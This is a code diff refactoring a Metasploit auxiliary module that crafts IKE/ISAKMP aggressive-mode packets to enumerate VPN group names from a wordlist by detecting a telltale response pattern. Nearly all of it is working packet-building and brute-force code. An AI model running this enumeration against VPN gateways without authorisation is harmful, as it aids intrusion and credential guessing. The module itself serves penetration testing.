@@ -35,170 +35,284 @@ class Metasploit3 < Msf::Auxiliary
 
 	end
 
-	class Isakmp_header < BitStruct
+	class IsakmpHeader < Struct.new(
+		:initiatorcookie,
+		:respondercookie,
+		:nextpayload,
+		:version,
+		:exchangetype,
+		:flags,
+		:messageid,
+		:length
+	)
 
-		text :initiatorcookie, 64
-		unsigned :respondercookie, 64, :format => "0x%x"
-		unsigned :nextpayload, 8, { :default => 0x1 }
-		unsigned :version, 8, { :default => 0x10 }
-		unsigned :exchangetype, 8, { :default => 0x4 }
-		unsigned :flags, 8, { :default => 0x0 }
-		unsigned :messageid, 32, { :default => 0x0 }
-		unsigned :length, 32, { :default => 0x0 }
-
-		def initialize(*args)
-			@options = []
-			super
+		def initialize
+			self.initiatorcookie = ""
+			self.respondercookie = ""
+			self.nextpayload = 1
+			self.version = 0x10
+			self.exchangetype = 0x4
+			self.flags = 0
+			self.messageid = 0
+			self.length = 0
 		end
+
+		def pack
+			[
+				initiatorcookie,
+				respondercookie,
+				nextpayload,
+				version,
+				exchangetype,
+				flags,
+				messageid,
+				length
+			].pack("a8a8CCCCNN")
+		end
+
 	end
 
-	class Isakmp_sa_payload < BitStruct
+	class IsakmpSaPayload < Struct.new(
+		:nextpayload,
+		:reserved,
+		:payloadlength,
+		:domain,
+		:situation
+	)
 
-		unsigned :nextpayload, 8, { :default => 0x4 }
-		unsigned :reserved, 8, { :default => 0x0 }
-		unsigned :payloadlength, 16, { :default => 0xa4 }
-		unsigned :domain, 32, { :default => 0x1 }
-		unsigned :situation, 32, { :default => 0x1 }
-
-		def initialize(*args)
-			@options = []
-			super
+		def initialize
+			self.nextpayload = 4
+			self.reserved = 0
+			self.payloadlength = 0xa4
+			self.domain = 1
+			self.situation = 1
 		end
+
+		def pack
+			[
+				nextpayload,
+				reserved,
+				payloadlength,
+				domain,
+				situation
+			].pack("CCnNN")
+		end
+
 	end
 
-	class Isakmp_proposal_payload < BitStruct
-
-		unsigned :nextpayload, 8, { :default => 0x0 }
-		unsigned :reserved, 8, { :default => 0x0 }
-		unsigned :payloadlength, 16, { :default => 0x98 }
-		unsigned :proposalnumber, 8, { :default => 0x1 }
-		unsigned :protocol, 8, { :default => 0x1 }
-		unsigned :spisize, 8, { :default => 0x0 }
-		unsigned :proposaltransforms, 8, { :default => 0x4 }
-
-		def initialize(*args)
-			@options = []
-			super
+	class IsakmpProposalPayload < Struct.new(
+		:nextpayload,
+		:reserved,
+		:payloadlength,
+		:proposalnumber,
+		:protocol,
+		:spisize,
+		:proposaltransforms
+	)
+		def initialize
+			self.nextpayload = 0
+			self.reserved = 0
+			self.payloadlength = 0x98
+			self.proposalnumber = 1
+			self.protocol = 1
+			self.spisize = 0
+			self.proposaltransforms = 4
 		end
+
+		def pack
+			[
+				nextpayload,
+				reserved,
+				payloadlength,
+				proposalnumber,
+				protocol,
+				spisize,
+				proposaltransforms
+			].pack("CCnCCCC")
+		end
+
 	end
 
-	class Isakmp_transform_payload < BitStruct
+	class IsakmpTransformPayload < Struct.new(
+		:nextpayload,
+		:reserved,
+		:payloadlength,
+		:number,
+		:id,
+		:padding,
+		:encryption,
+		:hash,
+		:authentication,
+		:groupdescription,
+		:lifetype,
+		:lifeduration
+	)
 
-		unsigned :nextpayload, 8, { :default => 0x3 }
-		unsigned :reserved, 8, { :default => 0x0 }
-		unsigned :payloadlength, 16, { :default => 0x0024 }
-		unsigned :number, 8, { :default => 0x1 }
-		unsigned :id, 8, { :default => 0x1 }
-		unsigned :padding, 16, { :default => 0x0 }
-		unsigned :encryption, 32, { :default => 0x80010005 }
-		unsigned :hash, 32, { :default => 0x80020002 }
-		unsigned :authentication, 32, { :default => 0x8003fde9 }
-		unsigned :groupdescription, 32, { :default => 0x80040002 }
-		unsigned :lifetype, 32, { :default => 0x800b0001 }
-		unsigned :lifeduration, 64, { :default => 0x000c000400007080 }
-
-		def initialize(*args)
-			@options = []
-			super
+		def initialize
+			self.nextpayload = 3
+			self.reserved = 0
+			self.payloadlength =  0x24
+			self.number = 1
+			self.id = 1
+			self.padding = 0
+			self.encryption = 0x80010005
+			self.hash = 0x80020002
+			self.authentication = 0x8003fde9
+			self.groupdescription = 0x80040002
+			self.lifetype = 0x800b0001
+			self.lifeduration = "\x00\x0c\x00\x04\x00\x00\x70\x80"
 		end
+
+		def pack
+			[
+				nextpayload,
+				reserved,
+				payloadlength,
+				number,
+				id,
+				padding,
+				encryption,
+				hash,
+				authentication,
+				groupdescription,
+				lifetype,
+				lifeduration
+			].pack("CCnCCnNNNNNA8")
+		end
+
 	end
 
-	class Isakmp_key_exchange_payload < BitStruct
+	class IsakmpKeyExchangePayload < Struct.new(
+		:nextpayload,
+		:reserved,
+		:payloadlength,
+		:data
+	)
 
-		unsigned :nextpayload, 8, { :default => 0xa }
-		unsigned :reserved, 8, { :default => 0x0 }
-		unsigned :payloadlength, 16, { :default => 0x0084 }
-		text :data, 1024, { :default => Rex::Text.rand_text(128,'0x0') }
-
-		def initialize(*args)
-			@options = []
-			super
+		def initialize
+			self.nextpayload = 5
+			self.reserved = 0
+			self.payloadlength = 0x84
+			self.data = Rex::Text.rand_text(128,'0x0')
 		end
+
+		def pack
+			[
+				nextpayload,
+				reserved,
+				payloadlength,
+				data
+			].pack("CCnA128")
+		end
+
 	end
 
-	class Isakmp_nonce_payload < BitStruct
+	class IsakmpNoncePayload < Struct.new(
+		:nextpayload,
+		:reserved,
+		:payloadlength,
+		:data
+	)
 
-		unsigned :nextpayload, 8, { :default => 0x5 }
-		unsigned :reserved, 8, { :default => 0x0 }
-		unsigned :payloadlength, 16, { :default => 0x0018 }
-		text :data, 160, { :default => Rex::Text.rand_text(20,'0x0') }
-
-		def initialize(*args)
-			@options = []
-			super
+		def initialize
+			self.nextpayload = 5
+			self.reserved = 0
+			self.payloadlength = 0x18
+			self.data = Rex::Text.rand_text(20,'0x0')
 		end
+
+		def pack
+			[
+				nextpayload,
+				reserved,
+				payloadlength,
+				data
+			].pack("CCnA20")
+		end
+
 	end
 
-	class Isakmp_id_payload < BitStruct
+	class IsakmpIdPayload < Struct.new(
+		:nextpayload,
+		:reserved,
+		:payloadlength,
+		:type,
+		:protocol,
+		:port,
+		:data
+	)
 
-		unsigned :nextpayload, 8, { :default => 0x0 }
-		unsigned :reserved, 8, { :default => 0x0 }
-		unsigned :payloadlength, 16, { :default => 0x0 }
-		unsigned :type, 8, { :default => 0xb }
-		unsigned :protocol, 8, { :default => 0x11 }
-		unsigned :port, 16, { :default => 0x01f4 }
-		rest :data
-
-		def initialize(*args)
-			@options = []
-			super
+		def initialize
+			self.nextpayload = 0
+			self.reserved = 0
+			self.payloadlength = 0
+			self.type = 0xb
+			self.protocol = 0x11
+			self.port = 500
+			self.data
 		end
+
+		def pack
+			[
+				nextpayload,
+				reserved,
+				payloadlength,
+				type,
+				protocol,
+				port,
+				data
+			].pack("CCnCCnA*")
+		end
+
 	end
 
 	def generate_isakmp_message
-		isakmp_hdr = Isakmp_header.new
+		isakmp_hdr = IsakmpHeader.new
 		isakmp_hdr.initiatorcookie = Rex::Text.rand_text(8,'0x0')
-		isakmp_hdr.respondercookie = 0x0
-		isakmp_sa = Isakmp_sa_payload.new
-		isakmp_proposal = Isakmp_proposal_payload.new
-		isakmp_transform1 = Isakmp_transform_payload.new
-		isakmp_transform2 = Isakmp_transform_payload.new
+		isakmp_sa = IsakmpSaPayload.new
+		isakmp_proposal = IsakmpProposalPayload.new
+		isakmp_transform1 = IsakmpTransformPayload.new
+		isakmp_transform2 = IsakmpTransformPayload.new
 		isakmp_transform2.number = 0x2
 		isakmp_transform2.hash = 0x80020001
-		isakmp_transform3 = Isakmp_transform_payload.new
+		isakmp_transform3 = IsakmpTransformPayload.new
 		isakmp_transform3.number = 0x3
 		isakmp_transform3.encryption = 0x80010001
 		isakmp_transform3.hash = 0x80020002
-		isakmp_transform4 = Isakmp_transform_payload.new
+		isakmp_transform4 = IsakmpTransformPayload.new
 		isakmp_transform4.number = 0x4
 		isakmp_transform4.encryption = 0x80010001
 		isakmp_transform4.hash = 0x80020001
 		isakmp_transform4.nextpayload = 0x0
-		isakmp_key_exchange = Isakmp_key_exchange_payload.new
-		isakmp_nonce = Isakmp_nonce_payload.new
-		isakmp_id = Isakmp_id_payload.new
+		isakmp_key_exchange = IsakmpKeyExchangePayload.new
+		isakmp_nonce = IsakmpNoncePayload.new
+		isakmp_id = IsakmpIdPayload.new
 		isakmp_id.payloadlength = @groupname.rstrip.length + 8
 		isakmp_id.data = @groupname.rstrip
 
 		isakmp_hdr.length = 356 + isakmp_id.data.length
 
 		payload = ""
-		payload << isakmp_hdr
-		payload << isakmp_sa
-		payload << isakmp_proposal
-		payload << isakmp_transform1
-		payload << isakmp_transform2
-		payload << isakmp_transform3
-		payload << isakmp_transform4
-		payload << isakmp_key_exchange
-		payload << isakmp_nonce
-		payload << isakmp_id
+		payload << isakmp_hdr.pack
+		payload << isakmp_sa.pack
+		payload << isakmp_proposal.pack
+		payload << isakmp_transform1.pack
+		payload << isakmp_transform2.pack
+		payload << isakmp_transform3.pack
+		payload << isakmp_transform4.pack
+		payload << isakmp_key_exchange.pack
+		payload << isakmp_nonce.pack
+		payload << isakmp_id.pack
 
 		return payload
 	end
 
-
 	def check_dpd(pkt)
-		pkt2hex = pkt.unpack('C'*pkt.length).collect {|x| x.to_s 16}.join
-		if pkt2hex =~ /afcad71368a1f1c96b8696fc77571/
-			return true
-		else
-			return false
-		end
+		pkt2hex = pkt.unpack("C*").map {|x| x.to_s(16)}.join
+		pkt2hex =~ /afcad71368a1f1c96b8696fc77571/i
 	end
 
 	def build_ipsec_pkt
-
 		payload = generate_isakmp_message
 		connect_udp
 		pcap = Pcap::open_live(datastore['INTERFACE'], 1500, false, datastore['TIMEOUT'].to_i)
@@ -224,7 +338,6 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def check_reachability
-
 		ipsecport = datastore['RPORT']
 		datastore['RPORT'] = 62515
 		pkt = "\x00\x00\xa5\x4b\x01\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -253,9 +366,9 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		open_pcap unless self.capture
 
-		groupnames = Array.new
+		groupnames = []
 		File.open(datastore['WORDLIST'],"rb").each_line do |line|
-			groupnames << line
+			groupnames << line.strip
 		end
 
 		if check_reachability
